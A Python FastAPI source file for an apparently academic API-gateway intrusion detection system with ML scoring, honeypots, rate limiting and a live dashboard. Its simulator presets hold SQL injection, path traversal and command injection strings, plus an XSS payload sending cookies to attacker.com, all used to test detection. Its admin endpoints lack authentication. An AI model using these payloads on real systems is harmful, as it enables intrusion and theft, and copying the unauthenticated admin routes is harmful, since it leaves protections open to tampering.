"""
AI-Powered API Gateway Intrusion Detection System (FastAPI).
Combines Reverse Proxy, Hybrid ML & SHAP Detection, Behavioral Analysis,
Sliding-Window Rate Limiting, Decoy Honeypots, Response PII Leak Filter,
WebSocket Live Telemetry, and Management APIs.
"""
import time
import json
import asyncio
from typing import List, Dict, Any, Optional
from contextlib import asynccontextmanager

from fastapi import (
    FastAPI,
    Request,
    Response,
    WebSocket,
    WebSocketDisconnect,
    HTTPException,
    Query,
    Body,
)
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
import httpx

from config import (
    GATEWAY_HOST,
    GATEWAY_PORT,
    TARGET_API_URL,
    DEFAULT_OPERATION_MODE,
    REPORTS_DIR,
    BASE_DIR,
)
from database import (
    init_db,
    log_request,
    log_alert,
    get_dashboard_metrics,
    get_all_alerts,
    get_all_requests,
    record_feedback,
)
from features import extract_features, features_to_vector
from detector import detector
from behavioral import behavior_tracker
from rate_limiter import SlidingWindowRateLimiter
from honeypot import honeypot_manager
from bot_detector import bot_detector
from auth_abuse import auth_abuse_detector
from leak_filter import inspect_and_mask_response
from notifier import dispatch_security_notification
from reports import export_requests_csv, export_alerts_csv, generate_academic_pdf_report
from demo_api import demo_router
from advanced_api import api_router
from services.ban_service import is_ip_allowlisted, is_ip_banned
from services.rule_service import match_rules
from services.endpoint_service import record_endpoint_traffic
from services.incident_service import correlate_alert_to_incident
from services.notification_service import dispatch_multi_channel_alert
from services.telegram_service import setup_telegram_bot


# WebSocket Connection Manager for Real-Time SOC Stream
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        disconnected = []
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception:
                disconnected.append(connection)
        for dead in disconnected:
            self.disconnect(dead)


ws_manager = ConnectionManager()
rate_limiter = SlidingWindowRateLimiter()
current_mode = DEFAULT_OPERATION_MODE  # 'learning', 'monitor', 'protect'
httpx_client: Optional[httpx.AsyncClient] = None


@asynccontextmanager
async def lifespan(app: FastAPI):
    global httpx_client
    print("[*] Initializing AI Gateway IDS Database and Models...")
    init_db()
    detector.load_models()
    httpx_client = httpx.AsyncClient(timeout=10.0)

    tg_app = setup_telegram_bot()
    if tg_app:
        try:
            await tg_app.initialize()
            await tg_app.start()
            if tg_app.updater:
                await tg_app.updater.start_polling()
            print("[OK] Telegram Bot live and listening for commands (@sarvajith_trade_bot).")
        except Exception as e:
            print(f"[!] Warning starting Telegram Bot: {e}")

    print(f"[OK] AI Gateway running in [{current_mode.upper()}] mode.")
    yield
    if tg_app:
        try:
            if tg_app.updater:
                await tg_app.updater.stop()
            await tg_app.stop()
            await tg_app.shutdown()
        except Exception:
            pass
    if httpx_client:
        await httpx_client.aclose()


app = FastAPI(
    title="AI-Powered API Gateway IDS",
    description="Machine Learning and Behavioral Analysis Security Gateway",
    version="1.0.0",
    lifespan=lifespan,
)

# Mount Protected Demo API & Advanced REST API Router
app.include_router(demo_router)
app.include_router(api_router)

# Mount Static Assets & React Frontend Bundle
static_dir = BASE_DIR / "static"
templates_dir = BASE_DIR / "templates"
reports_dir = BASE_DIR / "reports"
frontend_dist = BASE_DIR / "frontend" / "dist"
frontend_assets = frontend_dist / "assets"
frontend_images = frontend_dist / "images"
public_images = BASE_DIR / "frontend" / "public" / "images"

static_dir.mkdir(parents=True, exist_ok=True)
templates_dir.mkdir(parents=True, exist_ok=True)
reports_dir.mkdir(parents=True, exist_ok=True)
frontend_assets.mkdir(parents=True, exist_ok=True)
frontend_images.mkdir(parents=True, exist_ok=True)
public_images.mkdir(parents=True, exist_ok=True)

app.mount("/static", StaticFiles(directory=str(static_dir)), name="static")
app.mount("/reports", StaticFiles(directory=str(reports_dir)), name="reports")
app.mount("/assets", StaticFiles(directory=str(frontend_assets)), name="react-assets")
app.mount("/images", StaticFiles(directory=str(frontend_images)), name="images")
app.mount("/public/images", StaticFiles(directory=str(public_images)), name="public-images")


# -------------------------------------------------------------
# 1. UI Routes
# -------------------------------------------------------------
@app.get("/", response_class=HTMLResponse)
@app.get("/dashboard", response_class=HTMLResponse)
@app.get("/dashboard/{subpath:path}", response_class=HTMLResponse)
async def serve_dashboard():
    """Serves the modern React + Framer Motion UI (Landing page & SOC Dashboard)."""
    react_index = frontend_dist / "index.html"
    if react_index.exists():
        with open(react_index, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    index_file = templates_dir / "index.html"
    if index_file.exists():
        with open(index_file, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return HTMLResponse("<h1>AI Gateway IDS Dashboard (Loading assets...)</h1>")


# -------------------------------------------------------------
# 2. Real-Time WebSocket Telemetry
# -------------------------------------------------------------
@app.websocket("/ws/live")
async def websocket_live_feed(websocket: WebSocket):
    """Streams live requests, alerts, and KPI metric counters to the dashboard."""
    await ws_manager.connect(websocket)
    try:
        # Send initial metrics bundle
        metrics = get_dashboard_metrics()
        await websocket.send_json({"type": "INIT_METRICS", "data": metrics})
        while True:
            # Keep-alive loop
            _ = await websocket.receive_text()
    except WebSocketDisconnect:
        ws_manager.disconnect(websocket)
    except Exception:
        ws_manager.disconnect(websocket)


# -------------------------------------------------------------
# 3. Administrative & Management API Endpoints
# -------------------------------------------------------------
@app.get("/health")
async def health_status():
    """Self-monitoring health check endpoint for uptime and component status."""
    return {
        "status": "healthy",
        "gateway_mode": current_mode,
        "model_version": detector.model_version,
        "rate_limiter": "active",
        "honeypots": "active",
        "timestamp": time.time(),
    }


@app.get("/metrics/prometheus")
async def prometheus_metrics_export():
    """Prometheus-style metrics exporter for telemetry monitoring."""
    from fastapi.responses import PlainTextResponse
    m = get_dashboard_metrics()
    output = (
        f"# HELP aegis_requests_total Total number of requests inspected\n"
        f"# TYPE aegis_requests_total counter\n"
        f"aegis_requests_total {m['total_requests']}\n"
        f"# HELP aegis_requests_allowed Total allowed requests\n"
        f"# TYPE aegis_requests_allowed counter\n"
        f"aegis_requests_allowed {m['allowed_requests']}\n"
        f"# HELP aegis_requests_warned Total warned requests\n"
        f"# TYPE aegis_requests_warned counter\n"
        f"aegis_requests_warned {m['warned_requests']}\n"
        f"# HELP aegis_requests_blocked Total blocked requests\n"
        f"# TYPE aegis_requests_blocked counter\n"
        f"aegis_requests_blocked {m['blocked_requests']}\n"
        f"# HELP aegis_latency_avg_ms Average request latency in milliseconds\n"
        f"# TYPE aegis_latency_avg_ms gauge\n"
        f"aegis_latency_avg_ms {m['avg_latency_ms']}\n"
    )
    return PlainTextResponse(content=output)


@app.get("/api/metrics")
async def api_metrics():
    """Returns real-time KPI metrics and chart distribution data."""
    return get_dashboard_metrics()


@app.get("/api/alerts")
async def api_alerts(limit: int = Query(50)):
    """Returns security alerts."""
    return {"alerts": get_all_alerts(limit=limit)}


@app.get("/api/requests")
async def api_requests(limit: int = Query(50)):
    """Returns audit request log."""
    return {"requests": get_all_requests(limit=limit)}


@app.get("/api/settings")
async def get_settings():
    """Returns current gateway operating settings."""
    return {
        "mode": current_mode,
        "weight_ml": detector.weight_ml,
        "weight_behavioral": detector.weight_behavioral,
        "weight_rules": detector.weight_rules,
        "warn_threshold": detector.warn_threshold,
        "block_threshold": detector.block_threshold,
        "rate_limit_max": rate_limiter.max_requests,
        "rate_limit_window": rate_limiter.window_seconds,
        "autoban_minutes": honeypot_manager.ban_duration // 60,
    }


@app.post("/api/settings")
async def update_settings(payload: dict = Body(...)):
    """Updates gateway thresholds, mode, and weights dynamically."""
    global current_mode
    if "mode" in payload and payload["mode"] in ["learning", "monitor", "protect"]:
        current_mode = payload["mode"]

    w_ml = float(payload.get("weight_ml", detector.weight_ml))
    w_beh = float(payload.get("weight_behavioral", detector.weight_behavioral))
    w_rule = float(payload.get("weight_rules", detector.weight_rules))
    warn_th = float(payload.get("warn_threshold", detector.warn_threshold))
    block_th = float(payload.get("block_threshold", detector.block_threshold))

    detector.update_settings(w_ml, w_beh, w_rule, warn_th, block_th)

    if "rate_limit_max" in payload and "rate_limit_window" in payload:
        rate_limiter.update_settings(
            int(payload["rate_limit_max"]), int(payload["rate_limit_window"])
        )

    if "autoban_minutes" in payload:
        honeypot_manager.update_duration(int(payload["autoban_minutes"]))

    return {"status": "success", "message": "Settings updated successfully"}


@app.get("/api/bans")
async def get_bans():
    """Returns active client IP bans."""
    return {"active_bans": honeypot_manager.list_active_bans()}


@app.post("/api/bans/unban")
async def unban_ip(payload: dict = Body(...)):
    """Manually unbans an IP address."""
    ip = payload.get("ip", "")
    success = honeypot_manager.unban_ip(ip)
    rate_limiter.reset_client(ip)
    behavior_tracker.clear_client(ip)
    return {"status": "success" if success else "not_found", "ip": ip}


@app.post("/api/feedback")
async def submit_feedback(payload: dict = Body(...)):
    """Records False Positive / Confirmed Attack feedback for active learning."""
    alert_id = payload.get("alert_id")
    verdict = payload.get("verdict", "confirmed_attack")
    notes = payload.get("notes", "")
    record_feedback(alert_id, verdict, notes)
    return {"status": "success", "message": "Feedback recorded for active learning loop"}


@app.post("/api/retrain")
async def trigger_retrain():
    """Triggers dynamic model retraining with user feedback data."""
    try:
        from train_model import train_and_evaluate
        metrics = train_and_evaluate()
        detector.load_models()
        detector.model_version = "v1.1"
        await ws_manager.broadcast({
            "type": "MODEL_RETRAINED",
            "version": "v1.1",
            "accuracy": metrics["accuracy"],
            "f1": metrics["macro_f1"],
        })
        return {
            "status": "success",
            "message": "Model retrained to v1.1 with feedback incorporated",
            "metrics": metrics,
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/export/csv/requests")
async def download_requests_csv():
    """Exports audit requests as CSV."""
    csv_data = export_requests_csv()
    return Response(
        content=csv_data,
        media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=requests_audit.csv"},
    )


@app.get("/api/export/csv/alerts")
async def download_alerts_csv():
    """Exports alerts as CSV."""
    csv_data = export_alerts_csv()
    return Response(
        content=csv_data,
        media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=alerts_log.csv"},
    )


@app.get("/api/export/pdf")
async def download_pdf_report():
    """Generates and downloads the IEEE Academic Project Report PDF."""
    pdf_path = generate_academic_pdf_report()
    return FileResponse(
        path=pdf_path,
        filename="AI_Gateway_IDS_Academic_Report.pdf",
        media_type="application/pdf",
    )


# -------------------------------------------------------------
# 4. Interactive Request Playground & Simulator Endpoints
# -------------------------------------------------------------
@app.post("/api/playground/inspect")
async def playground_inspect(payload: dict = Body(...)):
    """
    Inspects a simulated request in the Playground without forwarding it anywhere.
    Returns full feature vector, SHAP explanation, and Allow/Warn/Block decision.
    """
    method = payload.get("method", "GET")
    path = payload.get("path", "/api/users")
    query = payload.get("query", "")
    body = payload.get("body", "")
    headers = payload.get("headers", {"user-agent": "Playground-Client/1.0"})

    result = detector.predict_request(
        method=method,
        path=path,
        query=query,
        body=body,
        headers=headers,
    )
    return result


@app.post("/api/simulator/send")
async def simulator_send(payload: dict = Body(...)):
    """
    Fires a simulated attack or benign scenario against the local gateway
    and returns immediate execution results.
    """
    scenario = payload.get("scenario", "benign")
    client_ip = payload.get("client_ip", "192.168.1.100")

    # Define scenario presets
    scenarios = {
        "benign": {
            "method": "GET",
            "path": "/demo/api/products",
            "query": "category=Hardware",
            "body": "",
            "headers": {"user-agent": "Mozilla/5.0"},
        },
        "sqli": {
            "method": "GET",
            "path": "/demo/api/users",
            "query": "search=admin' OR '1'='1' UNION SELECT 1,username,password,role FROM users--",
            "body": "",
            "headers": {"user-agent": "Mozilla/5.0"},
        },
        "xss": {
            "method": "GET",
            "path": "/demo/api/search",
            "query": "q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
            "body": "",
            "headers": {"user-agent": "Mozilla/5.0"},
        },
        "path_traversal": {
            "method": "GET",
            "path": "/demo/api/files/download",
            "query": "file=../../../../../../etc/passwd",
            "body": "",
            "headers": {"user-agent": "Mozilla/5.0"},
        },
        "command_injection": {
            "method": "POST",
            "path": "/demo/api/search",
            "query": "",
            "body": "q=test; cat /etc/passwd | whoami",
            "headers": {"user-agent": "Mozilla/5.0"},
        },
        "rate_limit_burst": {
            "method": "GET",
            "path": "/demo/api/products",
            "query": "",
            "body": "",
            "headers": {"user-agent": "Mozilla/5.0"},
            "burst_count": 60,
        },
        "honeypot_hit": {
            "method": "GET",
            "path": "/.env",
            "query": "",
            "body": "",
            "headers": {"user-agent": "Mozilla/5.0"},
        },
        "auth_abuse": {
            "method": "POST",
            "path": "/demo/api/login",
            "query": "",
            "body": json.dumps({"username": "admin", "password": "wrong_password_99"}),
            "headers": {"user-agent": "Mozilla/5.0"},
            "burst_count": 6,
        },
        "leak_test": {
            "method": "GET",
            "path": "/demo/api/leak-test",
            "query": "",
            "body": "",
            "headers": {"user-agent": "Mozilla/5.0"},
        },
    }

    preset = scenarios.get(scenario, scenarios["benign"])

    # If burst scenario
    if "burst_count" in preset:
        responses = []
        for i in range(preset["burst_count"]):
            # Trigger inspection through proxy handler
            res = await _process_request_pipeline(
                client_ip=client_ip,
                method=preset["method"],
                path=preset["path"],
                query=preset["query"],
                body=preset["body"],
                headers=preset["headers"],
            )
            responses.append(res)
            if res.get("status_code") == 429:
                break
        return {
            "status": "success",
            "scenario": scenario,
            "burst_sent": len(responses),
            "final_response": responses[-1],
        }

    # Standard single-shot scenario
    result = await _process_request_pipeline(
        client_ip=client_ip,
        method=preset["method"],
        path=preset["path"],
        query=preset["query"],
        body=preset["body"],
        headers=preset["headers"],
    )

    return {"status": "success", "scenario": scenario, "result": result}


@app.post("/api/simulator/waf-faceoff")
async def waf_faceoff_benchmark(payload: dict = Body(...)):
    """
    Runs the 'AI Gateway vs Traditional Regex WAF' Face-Off Benchmark.
    Tests an evasive / obfuscated attack payload against both naive regex
    and our multi-layer AI Gateway to demonstrate AI superiority.
    """
    raw_payload = payload.get("payload", "SEL/**/ECT 1,2 FROM users WHERE 'a'=%27a%27")

    # 1. Naive Traditional Regex WAF (Checks standard patterns without deep normalizer)
    import re
    naive_regex = re.compile(r"(\bSELECT\b.*\bFROM\b|<script\b|\.\./)", re.IGNORECASE)
    regex_matched = bool(naive_regex.search(raw_payload))

    traditional_waf_result = {
        "engine": "Traditional Signature/Regex WAF",
        "action": "BLOCK" if regex_matched else "BYPASSED (ALLOWED)",
        "caught": regex_matched,
        "explanation": "Signature matched" if regex_matched else "Evasion technique successfully bypassed static regex patterns!",
    }

    # 2. Our AI Gateway IDS Pipeline
    ai_result = detector.predict_request(
        method="GET",
        path="/demo/api/users",
        query=f"q={raw_payload}",
    )

    ai_gateway_result = {
        "engine": "AI-Powered Gateway IDS (Ours)",
        "action": ai_result["action"],
        "caught": ai_result["action"] in ["WARN", "BLOCK"],
        "risk_score": ai_result["risk_score"],
        "confidence": ai_result["confidence"],
        "attack_type": ai_result["attack_type"],
        "obfuscation_detected": ai_result["obfuscation_detected"],
        "obfuscation_techniques": ai_result["obfuscation_techniques"],
        "shap_reason": ai_result["reason_en"],
    }

    verdict = (
        "AI Gateway Successfully Caught Evasion"
        if (not traditional_waf_result["caught"] and ai_gateway_result["caught"])
        else "Both systems agreed"
    )

    return {
        "test_payload": raw_payload,
        "traditional_waf": traditional_waf_result,
        "ai_gateway": ai_gateway_result,
        "verdict": verdict,
    }


# -------------------------------------------------------------
# 5. Core Gateway Inspection & Proxying Pipeline
# -------------------------------------------------------------
async def _process_request_pipeline(
    client_ip: str,
    method: str,
    path: str,
    query: str,
    body: str,
    headers: Dict[str, str],
) -> Dict[str, Any]:
    """
    Internal execution pipeline for request inspection:
    1. Check Active Bans
    2. Check Decoy Honeypots
    3. Check Bot / Scanner
    4. Check Rate Limiter
    5. Feature Extraction + Hybrid ML + SHAP
    6. Policy Decision & Logging
    """
    t0 = time.perf_counter()

    # 0. Check Trusted Allowlist (Bypass Inspection)
    if is_ip_allowlisted(client_ip):
        return {
            "status_code": 200,
            "action": "ALLOW",
            "risk_score": 0.0,
            "attack_type": "Benign",
            "message": "Allowlisted Client",
            "reason_en": "Client IP is on the trusted allowlist.",
            "reason_ta": "நம்பகமான கிளையன்ட் IP பட்டியலில் உள்ளது.",
            "mitre": {"technique_id": "T0000", "technique_name": "Trusted Bypass"},
            "shap_contributions": [],
        }

    # 1. Check Unified Active IP/CIDR Ban
    ban_rec = is_ip_banned(client_ip)
    if ban_rec:
        exp_time = ban_rec.get("expires_at")
        rem = max(0, int(exp_time - time.time())) if exp_time else None
        rem_str = f"{rem}s" if rem else "Permanent"
        msg_en = f"IP {client_ip} is banned ({ban_rec.get('reason', 'Security Policy')}). Remaining: {rem_str}"
        msg_ta = f"IP {client_ip} முடக்கப்பட்டுள்ளது. மீதமுள்ள நேரம்: {rem_str}."
        log_request(
            timestamp=time.time(),
            client_ip=client_ip,
            method=method,
            path=path,
            query=query,
            status_code=403,
            risk_score=1.0,
            action="BLOCK",
            attack_type="Active_IP_Ban",
            latency_ms=1.1,
        )
        return {
            "status_code": 403,
            "action": "BLOCK",
            "risk_score": 1.0,
            "attack_type": "Active_IP_Ban",
            "message": msg_en,
            "reason_en": msg_en,
            "reason_ta": msg_ta,
            "mitre": {"technique_id": "T1592", "technique_name": "Decoy Trap Enforcement"},
            "shap_contributions": [{"feature": "ip_banned_active", "contribution": 1.0, "value": 1.0}],
        }

    # 1.5 Check Custom Perimeter Rules
    rule_match = match_rules({
        "method": method,
        "path": path,
        "query": query,
        "body": body,
        "client_ip": client_ip,
        "headers": headers,
    })
    if rule_match:
        rule_act = rule_match.get("action", "BLOCK")
        if rule_act == "BLOCK":
            req_id = log_request(
                timestamp=time.time(),
                client_ip=client_ip,
                method=method,
                path=path,
                query=query,
                status_code=403,
                risk_score=1.0,
                action="BLOCK",
                attack_type=f"Custom_Rule:{rule_match['name']}",
                latency_ms=1.2,
            )
            return {
                "status_code": 403,
                "action": "BLOCK",
                "risk_score": 1.0,
                "attack_type": f"Custom_Rule:{rule_match['name']}",
                "message": f"Blocked by custom perimeter rule: {rule_match['name']}",
                "reason_en": f"Matched custom rule '{rule_match['name']}': {rule_match.get('description', '')}",
                "reason_ta": f"தனிப்பயன் பாதுகாப்புக் கொள்கை '{rule_match['name']}' மூலம் தடுக்கப்பட்டது.",
                "mitre": {"technique_id": "T1190", "technique_name": "Custom Rule Enforcement"},
                "shap_contributions": [{"feature": "custom_rule_matched", "contribution": 1.0, "value": 1.0}],
            }

    # 2. Check Decoy Honeypot Hit
    if honeypot_manager.is_honeypot_hit(path):
        ban = honeypot_manager.trigger_ban(client_ip, f"Accessed Honeypot Route {path}")
        req_id = log_request(
            timestamp=time.time(),
            client_ip=client_ip,
            method=method,
            path=path,
            query=query,
            status_code=403,
            risk_score=1.0,
            action="BLOCK",
            attack_type="Honeypot_Trap",
            latency_ms=1.5,
        )
        log_alert(
            request_id=req_id,
            timestamp=time.time(),
            client_ip=client_ip,
            attack_type="Honeypot_Trap",
            risk_score=1.0,
            confidence=1.0,
            mitre_id="T1592",
            mitre_tactic="Reconnaissance",
            reason=f"Decoy honeypot route ({path}) accessed. Immediate 10-minute auto-ban activated.",
            reason_ta=f"தேன் தொட்டி பாதை ({path}) அணுகப்பட்டது. 10 நிமிட தானியங்கி முடக்கம் செயல்படுத்தப்பட்டது.",
            indicators=["honeypot_trap", "auto_ban_triggered"],
            shap_contributions=[{"feature": "honeypot_decoy", "contribution": 1.0, "value": 1.0}],
            raw_payload=path,
            decoded_payload=path,
        )
        await ws_manager.broadcast({
            "type": "NEW_ALERT",
            "attack_type": "Honeypot_Trap",
            "client_ip": client_ip,
            "action": "BLOCK",
            "risk_score": 1.0,
            "reason": f"Decoy Honeypot Hit ({path}) - Auto-Ban Active",
        })
        return {
            "status_code": 403,
            "action": "BLOCK",
            "risk_score": 1.0,
            "attack_type": "Honeypot_Trap",
            "message": f"Access Denied. Target endpoint {path} is a protected decoy honeypot. IP has been temporarily banned.",
            "reason_en": f"Decoy honeypot route ({path}) accessed. Immediate auto-ban activated.",
            "reason_ta": f"தேன் தொட்டி பாதை ({path}) அணுகப்பட்டது. உடனடி தானியங்கி முடக்கம் செயல்படுத்தப்பட்டது.",
            "mitre": {"technique_id": "T1592", "technique_name": "Decoy Trap Enforcement"},
            "shap_contributions": [{"feature": "honeypot_decoy", "contribution": 1.0, "value": 1.0}],
        }

    # 3. Check Bot & Scanner Signatures
    is_bot, bot_risk, bot_reason = bot_detector.evaluate_request(client_ip, headers)

    # 4. Check Sliding-Window Rate Limiter
    allowed, req_count, max_limit = rate_limiter.is_allowed(client_ip)
    if not allowed:
        req_id = log_request(
            timestamp=time.time(),
            client_ip=client_ip,
            method=method,
            path=path,
            query=query,
            status_code=429,
            risk_score=0.85,
            action="BLOCK",
            attack_type="Rate_Limit_Violation",
            latency_ms=1.2,
        )
        await ws_manager.broadcast({
            "type": "NEW_ALERT",
            "attack_type": "Rate_Limit_Violation",
            "client_ip": client_ip,
            "action": "BLOCK",
            "risk_score": 0.85,
            "reason": f"Sliding window rate limit reached ({req_count}/{max_limit} reqs)",
        })
        msg_rl = f"Rate limit exceeded ({req_count}/{max_limit} per {rate_limiter.window_seconds}s)."
        return {
            "status_code": 429,
            "action": "BLOCK",
            "risk_score": 0.85,
            "attack_type": "Rate_Limit_Violation",
            "message": f"HTTP 429 Too Many Requests: {msg_rl}",
            "reason_en": msg_rl,
            "reason_ta": f"கோரிக்கை வரம்பு மீறப்பட்டது ({req_count}/{max_limit} கோரிக்கைகள்).",
            "mitre": {"technique_id": "T1499", "technique_name": "Endpoint Denial of Service"},
            "shap_contributions": [{"feature": "rate_limit_exceeded", "contribution": 0.85, "value": float(req_count)}],
        }

    # 5. Client Behavioral Analysis
    client_metrics = behavior_tracker.get_client_metrics(client_ip)

    # 6. Feature Extraction & Hybrid ML Prediction
    prediction = detector.predict_request(
        method=method,
        path=path,
        query=query,
        body=body,
        headers=headers,
        client_stats=client_metrics,
        rule_risk=bot_risk if is_bot else 0.0,
    )

    # Operational Mode Override
    action = prediction["action"]
    if current_mode == "learning":
        action = "ALLOW"
    elif current_mode == "monitor" and action == "BLOCK":
        action = "WARN"

    status_code = 403 if action == "BLOCK" else 200

    t1 = time.perf_counter()
    latency_ms = round((t1 - t0) * 1000.0, 2)

    # Log to SQLite
    req_id = log_request(
        timestamp=time.time(),
        client_ip=client_ip,
        method=method,
        path=path,
        query=query,
        status_code=status_code,
        risk_score=prediction["risk_score"],
        action=action,
        attack_type=prediction["attack_type"],
        latency_ms=latency_ms,
    )

    # Record in behavioral tracker
    is_suspicious = action in ["WARN", "BLOCK"]
    behavior_tracker.record_request(client_ip, path, status_code, is_suspicious)

    # If WARN or BLOCK, record formal alert
    if is_suspicious:
        alert_id = log_alert(
            request_id=req_id,
            timestamp=time.time(),
            client_ip=client_ip,
            attack_type=prediction["attack_type"],
            risk_score=prediction["risk_score"],
            confidence=prediction["confidence"],
            mitre_id=prediction["mitre"]["technique_id"],
            mitre_tactic=prediction["mitre"]["tactic"],
            reason=prediction["reason_en"],
            reason_ta=prediction["reason_ta"],
            indicators=prediction["triggered_indicators"],
            shap_contributions=prediction["shap_contributions"],
            raw_payload=f"{path}?{query} {body}".strip(),
            decoded_payload=prediction["normalized_payload"],
        )
        prediction["alert_id"] = alert_id

        # Dispatch async notification on BLOCK
        if action == "BLOCK":
            dispatch_security_notification({
                "action": action,
                "attack_type": prediction["attack_type"],
                "risk_score": prediction["risk_score"],
                "client_ip": client_ip,
                "mitre_id": prediction["mitre"]["technique_id"],
                "reason": prediction["reason_en"],
            })

        # Auto-Correlate into Incidents
        correlate_alert_to_incident({
            "id": alert_id,
            "timestamp": time.time(),
            "client_ip": client_ip,
            "attack_type": prediction["attack_type"],
            "risk_score": prediction["risk_score"],
            "mitre_id": prediction["mitre"]["technique_id"],
            "reason": prediction["reason_en"],
            "raw_payload": f"{path}?{query} {body}".strip(),
        })

        # Multi-Channel Alert Dispatch (Slack, Discord, SIEM, Email)
        try:
            asyncio.create_task(dispatch_multi_channel_alert({
                "id": alert_id,
                "client_ip": client_ip,
                "attack_type": prediction["attack_type"],
                "risk_score": prediction["risk_score"],
                "action": action,
                "reason": prediction["reason_en"],
                "raw_payload": f"{path}?{query} {body}".strip(),
            }))
        except Exception:
            pass

    # Record API Endpoint Discovery & Latency Telemetry
    try:
        has_auth = "authorization" in [k.lower() for k in headers.keys()]
        record_endpoint_traffic(
            method=method,
            path=path,
            is_attack=is_suspicious,
            latency_ms=latency_ms,
            has_auth_header=has_auth,
        )
    except Exception:
        pass

    # Broadcast Live Telemetry via WebSocket
    await ws_manager.broadcast({
        "type": "NEW_REQUEST",
        "id": req_id,
        "client_ip": client_ip,
        "method": method,
        "path": path,
        "risk_score": prediction["risk_score"],
        "action": action,
        "attack_type": prediction["attack_type"],
        "latency_ms": latency_ms,
        "timestamp": time.time(),
        "reason_en": prediction["reason_en"],
        "reason_ta": prediction["reason_ta"],
        "shap_contributions": prediction["shap_contributions"],
    })

    return {
        "status_code": status_code,
        "action": action,
        "risk_score": prediction["risk_score"],
        "attack_type": prediction["attack_type"],
        "confidence": prediction["confidence"],
        "latency_ms": latency_ms,
        "reason_en": prediction["reason_en"],
        "reason_ta": prediction["reason_ta"],
        "mitre": prediction["mitre"],
        "shap_contributions": prediction["shap_contributions"],
        "obfuscation_detected": prediction["obfuscation_detected"],
        "obfuscation_techniques": prediction["obfuscation_techniques"],
    }


# -------------------------------------------------------------
# 6. Global Reverse Proxy Middleware for Incoming Traffic
# -------------------------------------------------------------
@app.api_route("/{full_path:path}", methods=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"])
async def gateway_reverse_proxy(request: Request, full_path: str):
    """
    Transparent Reverse Proxy inspecting every HTTP request before forwarding
    to the protected backend API.
    """
    # Exclude UI, static, and API routes from reverse proxying
    excluded_prefixes = ["api", "dashboard", "static", "assets", "reports", "ws", "health", "metrics", "docs", "openapi.json", "redoc", "favicon.ico", "favicon.svg", "vite.svg", "images", "public"]
    for prefix in excluded_prefixes:
        if full_path == prefix or full_path.startswith(f"{prefix}/"):
            raise HTTPException(status_code=404, detail="Not Found")

    client_ip = request.client.host if request.client else "127.0.0.1"
    method = request.method
    path = f"/{full_path}"
    query = str(request.query_params)
    body_bytes = await request.body()
    body_text = body_bytes.decode("utf-8", errors="ignore")
    headers_dict = dict(request.headers)

    # 1. Run through inspection pipeline
    inspection = await _process_request_pipeline(
        client_ip=client_ip,
        method=method,
        path=path,
        query=query,
        body=body_text,
        headers=headers_dict,
    )

    # 2. If Blocked, return HTTP 403 Forbidden with incident justification
    if inspection["action"] == "BLOCK":
        status_c = inspection.get("status_code", 403)
        return JSONResponse(
            status_code=status_c,
            content={
                "error": f"HTTP {status_c}: Request Blocked by AI Gateway IDS",
                "incident_ticket": f"IDS-{int(time.time()*1000)}",
                "attack_classification": inspection.get("attack_type", "Threat_Blocked"),
                "risk_score": inspection.get("risk_score", 1.0),
                "mitre_technique": inspection.get("mitre", {}).get("technique_id", "T1190") if isinstance(inspection.get("mitre"), dict) else "T1190",
                "reason": inspection.get("reason_en") or inspection.get("message", "Request identified as hostile"),
                "reason_tamil": inspection.get("reason_ta") or "கோரிக்கை அச்சுறுத்தலாக கண்டறியப்பட்டு தடுக்கப்பட்டது.",
                "shap_explanations": inspection.get("shap_contributions", []),
            },
        )

    # 3. Transparently Forward Allowed / Warned Requests to Protected Backend
    # Map to demo backend if default target URL points to demo
    backend_base = TARGET_API_URL.rstrip("/")
    target_url = f"{backend_base}{path}"
    if query:
        target_url = f"{target_url}?{query}"

    try:
        # Proxy request using httpx
        fwd_resp = await httpx_client.request(
            method=method,
            url=target_url,
            headers={k: v for k, v in headers_dict.items() if k.lower() != "host"},
            content=body_bytes,
        )

        resp_text = fwd_resp.text

        # 4. Response Data Leak Prevention Check
        sanitized_text, leak_prevented, leaks = inspect_and_mask_response(resp_text)
        if leak_prevented:
            await ws_manager.broadcast({
                "type": "DATA_LEAK_PREVENTED",
                "path": path,
                "categories": leaks,
                "timestamp": time.time(),
            })

        return Response(
            content=sanitized_text.encode("utf-8"),
            status_code=fwd_resp.status_code,
            headers={k: v for k, v in fwd_resp.headers.items() if k.lower() not in ["content-length", "content-encoding"]},
        )

    except Exception as exc:
        return JSONResponse(
            status_code=502,
            content={"error": "Bad Gateway: Failed to forward request to protected backend", "detail": str(exc)},
        )


if __name__ == "__main__":
    import uvicorn
    print(f"[*] Starting AI-Powered API Gateway on http://{GATEWAY_HOST}:{GATEWAY_PORT}")
    uvicorn.run("app:app", host=GATEWAY_HOST, port=GATEWAY_PORT, reload=False)
